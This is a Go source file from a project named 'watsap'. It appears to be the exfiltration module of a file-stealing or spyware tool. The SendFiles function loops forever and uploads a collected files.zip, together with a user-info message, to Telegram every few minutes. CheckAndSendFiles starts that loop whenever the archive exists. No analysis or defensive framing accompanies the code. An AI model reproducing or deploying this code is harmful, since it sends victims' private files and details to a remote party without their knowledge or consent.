package files

import (
	"log"
	"time"
	"watsap/utils/config"
	"watsap/utils/files"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

var zipFile = config.WaDir + "/files.zip"

func SendFiles() {
	log.Println("SendFiles started")
	for {
		err := telegram.TgSendFile(zipFile, messages.GetUserInfoMsg())
		if err != nil {
			log.Printf("[Files] Error sending file: %s", err.Error())
		} else {
			log.Println("[Files] File Sent")
		}
		if config.DebugMode {
			log.Println("DebugMode is ON, sleeping for 5 seconds")
			time.Sleep(5 * time.Second)
		} else {
			if config.FirstRun {
				log.Println("FirstRun is true, sleeping for 10 minutes")
				time.Sleep(10 * time.Minute)
			} else {
				log.Println("Sleeping for 30 minutes")
				time.Sleep(30 * time.Minute)
			}
		}
	}
}

func CheckAndSendFiles() {
	log.Println("CheckAndSendFiles called")
	if files.Exists(zipFile) {
		log.Println("zipFile exists, sending files")
		SendFiles()
	} else {
		log.Printf("[Files] File not found: %s", zipFile)
	}
}
